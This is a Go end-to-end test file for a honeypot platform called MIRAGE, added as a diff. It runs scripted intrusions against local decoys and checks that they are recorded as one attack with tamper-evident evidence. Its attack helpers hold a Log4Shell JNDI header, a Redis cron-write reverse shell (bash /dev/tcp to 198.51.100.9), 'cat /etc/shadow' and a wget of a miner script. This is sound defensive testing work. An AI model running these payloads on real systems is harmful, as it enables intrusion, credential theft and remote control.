@@ -1,0 +1,536 @@
+// Package e2e exercises a complete MIRAGE deployment: the same wiring the
+// binary uses, driven by a scripted intrusion, asserted on the evidence that
+// comes out the other end.
+package e2e
+
+import (
+	"bufio"
+	"context"
+	"encoding/json"
+	"fmt"
+	"log/slog"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+	"time"
+
+	"golang.org/x/crypto/ssh"
+
+	"github.com/sauron666/Honeypot/internal/app"
+	"github.com/sauron666/Honeypot/internal/config"
+	"github.com/sauron666/Honeypot/internal/engagement"
+	"github.com/sauron666/Honeypot/internal/event"
+	"github.com/sauron666/Honeypot/internal/store"
+)
+
+// freePort asks the kernel for an unused port and gives it straight back. There
+// is a race in principle; in practice it is the standard way to get a port for
+// a test that needs a real listener.
+func freePort(t *testing.T) int {
+	t.Helper()
+	l, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer l.Close()
+	return l.Addr().(*net.TCPAddr).Port
+}
+
+type deployment struct {
+	app   *app.App
+	ports map[string]int
+	api   string
+	dir   string
+}
+
+func deploy(t *testing.T) *deployment {
+	t.Helper()
+	dir := t.TempDir()
+	ports := map[string]int{
+		"api": freePort(t), "ssh": freePort(t), "http": freePort(t),
+		"redis": freePort(t), "telnet": freePort(t), "ftp": freePort(t),
+	}
+
+	yaml := fmt.Sprintf(`
+tenant: e2e
+site: lab
+data_dir: %s
+api:
+  listen: 127.0.0.1:%d
+honeyd:
+  bind: 127.0.0.1
+  decoys:
+    - id: dcy-web01
+      persona: linux/web
+      services:
+        - {service: ssh,    port: %d}
+        - {service: http,   port: %d}
+        - {service: telnet, port: %d}
+        - {service: ftp,    port: %d}
+    - id: dcy-db01
+      persona: linux/db
+      services:
+        - {service: redis, port: %d}
+engagement:
+  idle_timeout: 30m
+alerts:
+  min_severity: high
+  sinks:
+    - driver: file
+      config:
+        path: alerts.jsonl
+`, dir, ports["api"], ports["ssh"], ports["http"], ports["telnet"], ports["ftp"], ports["redis"])
+
+	cfg, err := config.Parse([]byte(yaml))
+	if err != nil {
+		t.Fatalf("config: %v", err)
+	}
+	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
+	if err != nil {
+		t.Fatalf("app.New: %v", err)
+	}
+	if err := a.Start(context.Background()); err != nil {
+		t.Fatalf("start: %v", err)
+	}
+	t.Cleanup(func() {
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+		a.Stop(ctx)
+	})
+
+	d := &deployment{app: a, ports: ports, api: fmt.Sprintf("http://127.0.0.1:%d", ports["api"]), dir: dir}
+	d.waitReady(t)
+	return d
+}
+
+func (d *deployment) waitReady(t *testing.T) {
+	t.Helper()
+	deadline := time.Now().Add(15 * time.Second)
+	for time.Now().Before(deadline) {
+		resp, err := http.Get(d.api + "/api/health")
+		if err == nil {
+			resp.Body.Close()
+			if resp.StatusCode == 200 {
+				return
+			}
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	t.Fatal("deployment did not become ready")
+}
+
+func (d *deployment) addr(service string) string {
+	return fmt.Sprintf("127.0.0.1:%d", d.ports[service])
+}
+
+func (d *deployment) getJSON(t *testing.T, path string, into any) {
+	t.Helper()
+	resp, err := http.Get(d.api + path)
+	if err != nil {
+		t.Fatalf("GET %s: %v", path, err)
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 {
+		t.Fatalf("GET %s: %s", path, resp.Status)
+	}
+	if err := json.NewDecoder(resp.Body).Decode(into); err != nil {
+		t.Fatalf("decode %s: %v", path, err)
+	}
+}
+
+// TestFullIntrusionProducesOneEngagement scripts an intrusion the way a real
+// one arrives -- recon on the web decoy, a Redis takeover attempt, a telnet
+// brute force, then a hands-on SSH session -- and asserts that MIRAGE turns it
+// into a single, complete, tamper-evident story.
+func TestFullIntrusionProducesOneEngagement(t *testing.T) {
+	d := deploy(t)
+
+	// 1. Reconnaissance against the web decoy.
+	base := "http://" + d.addr("http")
+	client := &http.Client{Timeout: 10 * time.Second}
+	for _, path := range []string{"/", "/.env", "/.git/config", "/wp-login.php",
+		"/index.php?file=../../../../etc/passwd"} {
+		resp, err := client.Get(base + path)
+		if err != nil {
+			t.Fatalf("recon %s: %v", path, err)
+		}
+		resp.Body.Close()
+	}
+	// Exploit attempt in a header, which is where Log4Shell actually arrives.
+	req, _ := http.NewRequest("GET", base+"/", nil)
+	req.Header.Set("User-Agent", "${jndi:ldap://198.51.100.5:1389/x}")
+	if resp, err := client.Do(req); err == nil {
+		resp.Body.Close()
+	}
+
+	// 2. Redis takeover chain against the database decoy.
+	redisAttack(t, d.addr("redis"))
+
+	// 3. Telnet brute force, then a successful login and hands-on commands.
+	telnetAttack(t, d.addr("telnet"))
+
+	// 4. SSH session that reads the planted credentials.
+	sshAttack(t, d.addr("ssh"))
+
+	// --- assertions on the story -----------------------------------------
+	var engResp struct {
+		Engagements []engagement.Engagement `json:"engagements"`
+	}
+	waitUntil(t, 10*time.Second, "engagement to reach maximum risk", func() bool {
+		d.getJSON(t, "/api/engagements", &engResp)
+		return len(engResp.Engagements) == 1 && engResp.Engagements[0].RiskScore >= 90
+	})
+
+	eng := engResp.Engagements[0]
+	if len(engResp.Engagements) != 1 {
+		t.Fatalf("one attacker produced %d engagements; the stitching is broken", len(engResp.Engagements))
+	}
+	for _, svc := range []string{"http", "redis", "telnet", "ssh"} {
+		if !contains(eng.Services, svc) {
+			t.Errorf("engagement is missing the %s leg: %v", svc, eng.Services)
+		}
+	}
+	if len(eng.Decoys) != 2 {
+		t.Errorf("engagement should span both decoys, got %v", eng.Decoys)
+	}
+	if !eng.Authenticated {
+		t.Error("engagement should be marked authenticated")
+	}
+	if len(eng.HoneytokensHit) == 0 {
+		t.Error("the planted credentials were read but no honeytoken hit was recorded")
+	}
+	if len(eng.PayloadURLs) == 0 {
+		t.Error("the attacker's payload URL was not captured")
+	}
+	// The techniques are what a report is built from; a handful of the obvious
+	// ones must be present.
+	for _, want := range []string{"T1110", "T1105", "T1003.008", "T1595.003"} {
+		if !contains(eng.Techniques, want) {
+			t.Errorf("engagement is missing technique %s: %v", want, eng.Techniques)
+		}
+	}
+
+	// --- assertions on the evidence ---------------------------------------
+	var evResp struct {
+		Events []*event.Event `json:"events"`
+	}
+	d.getJSON(t, "/api/engagements/"+eng.ID+"/events?limit=1000", &evResp)
+	if len(evResp.Events) < 25 {
+		t.Fatalf("engagement timeline has only %d events", len(evResp.Events))
+	}
+	// The timeline must read forward in time: it is the incident narrative.
+	for i := 1; i < len(evResp.Events); i++ {
+		if evResp.Events[i].Time < evResp.Events[i-1].Time {
+			t.Fatalf("engagement timeline is not in chronological order at index %d", i)
+		}
+	}
+
+	// The chain must verify through the API and offline, over the same file.
+	var verify struct {
+		Verified bool   `json:"verified"`
+		Events   uint64 `json:"events"`
+		Error    string `json:"error"`
+	}
+	resp, err := http.Post(d.api+"/api/evidence/verify", "application/json", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	json.NewDecoder(resp.Body).Decode(&verify)
+	resp.Body.Close()
+	if !verify.Verified {
+		t.Fatalf("evidence chain does not verify: %s", verify.Error)
+	}
+
+	// --- assertions on alerting -------------------------------------------
+	alertPath := filepath.Join(d.dir, "alerts.jsonl")
+	raw, err := os.ReadFile(alertPath)
+	if err != nil {
+		t.Fatalf("no alerts were written: %v", err)
+	}
+	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
+	if len(lines) < 3 {
+		t.Fatalf("expected several alerts, got %d", len(lines))
+	}
+	var sawHoneytoken, sawAuth bool
+	for _, l := range lines {
+		var a map[string]any
+		if err := json.Unmarshal([]byte(l), &a); err != nil {
+			t.Fatalf("alert is not valid JSON: %v", err)
+		}
+		if a["url"] == "" {
+			t.Error("alert has no link back to its engagement")
+		}
+		switch a["title"] {
+		case "Honeytoken accessed":
+			sawHoneytoken = true
+		case "Attacker authenticated to a decoy", "Decoy login succeeded":
+			sawAuth = true
+		}
+	}
+	if !sawHoneytoken {
+		t.Error("reading planted credentials did not produce an alert")
+	}
+	if !sawAuth {
+		t.Error("an attacker authenticating did not produce an alert")
+	}
+}
+
+// TestEvidenceSurvivesRestart proves the chain spans process lifetimes: a
+// restart must not be a way to launder tampered evidence.
+func TestEvidenceSurvivesRestart(t *testing.T) {
+	dir := t.TempDir()
+	yamlFor := func(apiPort, httpPort int) string {
+		return fmt.Sprintf(`
+tenant: e2e
+site: lab
+data_dir: %s
+api: {listen: "127.0.0.1:%d"}
+honeyd:
+  bind: 127.0.0.1
+  decoys:
+    - id: dcy-web01
+      persona: linux/web
+      services: [{service: http, port: %d}]
+alerts:
+  min_severity: critical
+  sinks: [{driver: stdout}]
+`, dir, apiPort, httpPort)
+	}
+
+	run := func() uint64 {
+		cfg, err := config.Parse([]byte(yamlFor(freePort(t), freePort(t))))
+		if err != nil {
+			t.Fatal(err)
+		}
+		a, err := app.New(cfg, slog.New(slog.DiscardHandler))
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := a.Start(context.Background()); err != nil {
+			t.Fatal(err)
+		}
+		addr := a.Farm.Addrs()[0]
+		for i := 0; i < 5; i++ {
+			resp, err := http.Get("http://" + addr + "/.env")
+			if err != nil {
+				t.Fatal(err)
+			}
+			resp.Body.Close()
+		}
+		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer cancel()
+		st := a.Store.Stats()
+		if err := a.Stop(ctx); err != nil {
+			t.Fatal(err)
+		}
+		return st.Events
+	}
+
+	first := run()
+	second := run()
+	if second <= first {
+		t.Fatalf("second run started a new chain (%d then %d): evidence would be lost", first, second)
+	}
+
+	st, err := store.OpenFile(filepath.Join(dir, "evidence.jsonl"),
+		store.FileOptions{MemoryWindow: 10, SyncEvery: 0})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer st.Close()
+	if err := st.Verify(context.Background()); err != nil {
+		t.Fatalf("chain spanning two runs does not verify: %v", err)
+	}
+}
+
+// TestManagementAPIRequiresItsToken checks the control plane is not readable by
+// anyone who can reach the port.
+func TestManagementAPIRequiresItsToken(t *testing.T) {
+	dir := t.TempDir()
+	apiPort := freePort(t)
+	cfg, err := config.Parse([]byte(fmt.Sprintf(`
+tenant: e2e
+site: lab
+data_dir: %s
+api:
+  listen: "127.0.0.1:%d"
+  token: "s3cret-token"
+honeyd:
+  bind: 127.0.0.1
+  decoys:
+    - id: d
+      persona: linux/web
+      services: [{service: http, port: %d}]
+`, dir, apiPort, freePort(t))))
+	if err != nil {
+		t.Fatal(err)
+	}
+	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := a.Start(context.Background()); err != nil {
+		t.Fatal(err)
+	}
+	defer func() {
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		a.Stop(ctx)
+	}()
+
+	base := fmt.Sprintf("http://127.0.0.1:%d", apiPort)
+	waitUntil(t, 10*time.Second, "api to start", func() bool {
+		resp, err := http.Get(base + "/api/health")
+		if err != nil {
+			return false
+		}
+		resp.Body.Close()
+		return true
+	})
+
+	resp, err := http.Get(base + "/api/events")
+	if err != nil {
+		t.Fatal(err)
+	}
+	resp.Body.Close()
+	if resp.StatusCode != http.StatusUnauthorized {
+		t.Fatalf("evidence readable without a token: %s", resp.Status)
+	}
+
+	req, _ := http.NewRequest("GET", base+"/api/events", nil)
+	req.Header.Set("Authorization", "Bearer s3cret-token")
+	resp, err = http.DefaultClient.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("valid token rejected: %s", resp.Status)
+	}
+}
+
+// --- attack helpers --------------------------------------------------------
+
+func redisAttack(t *testing.T, addr string) {
+	t.Helper()
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		t.Fatalf("redis dial: %v", err)
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(15 * time.Second))
+	r := bufio.NewReader(conn)
+
+	for _, cmd := range []string{
+		"PING", "INFO",
+		"CONFIG SET dir /var/spool/cron",
+		"CONFIG SET dbfilename root",
+		`SET pwn "* * * * * bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"`,
+		"SAVE",
+	} {
+		fmt.Fprintf(conn, "%s\r\n", cmd)
+		if _, err := r.ReadString('\n'); err != nil {
+			t.Fatalf("redis %q: %v", cmd, err)
+		}
+	}
+}
+
+func telnetAttack(t *testing.T, addr string) {
+	t.Helper()
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		t.Fatalf("telnet dial: %v", err)
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(40 * time.Second))
+	r := bufio.NewReader(conn)
+
+	expect(t, r, "login:")
+	fmt.Fprint(conn, "root\r\n")
+	expect(t, r, "Password:")
+	fmt.Fprint(conn, "hunter2\r\n") // wrong on purpose
+	expect(t, r, "Login incorrect")
+
+	expect(t, r, "login:")
+	fmt.Fprint(conn, "root\r\n")
+	expect(t, r, "Password:")
+	fmt.Fprint(conn, "toor\r\n") // one of the planted weak passwords
+	expect(t, r, "root@")
+
+	for _, cmd := range []string{"uname -a", "cat /etc/shadow", "wget http://198.51.100.66/miner.sh"} {
+		fmt.Fprintf(conn, "%s\r\n", cmd)
+		expect(t, r, "root@")
+	}
+	fmt.Fprint(conn, "exit\r\n")
+}
+
+func sshAttack(t *testing.T, addr string) {
+	t.Helper()
+	client, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
+		User:            "deploy",
+		Auth:            []ssh.AuthMethod{ssh.Password("Summer2024!")},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         15 * time.Second,
+	})
+	if err != nil {
+		t.Fatalf("ssh dial: %v", err)
+	}
+	defer client.Close()
+
+	sess, err := client.NewSession()
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer sess.Close()
+	out, err := sess.Output("cat /var/www/html/.env")
+	if err != nil {
+		t.Fatalf("ssh exec: %v", err)
+	}
+	if !strings.Contains(string(out), "DB_PASSWORD=") {
+		t.Fatalf("planted credentials not served over ssh: %q", out)
+	}
+}
+
+func expect(t *testing.T, r *bufio.Reader, want string) {
+	t.Helper()
+	var sb strings.Builder
+	buf := make([]byte, 1)
+	deadline := time.Now().Add(30 * time.Second)
+	for time.Now().Before(deadline) {
+		n, err := r.Read(buf)
+		if n > 0 {
+			sb.WriteByte(buf[0])
+			if strings.Contains(sb.String(), want) {
+				return
+			}
+		}
+		if err != nil {
+			t.Fatalf("waiting for %q: %v (got %q)", want, err, sb.String())
+		}
+	}
+	t.Fatalf("timed out waiting for %q, got %q", want, sb.String())
+}
+
+func waitUntil(t *testing.T, d time.Duration, what string, pred func() bool) {
+	t.Helper()
+	deadline := time.Now().Add(d)
+	for time.Now().Before(deadline) {
+		if pred() {
+			return
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	t.Fatalf("timed out waiting for %s", what)
+}
+
+func contains(list []string, want string) bool {
+	for _, s := range list {
+		if s == want {
+			return true
+		}
+	}
+	return false
+}
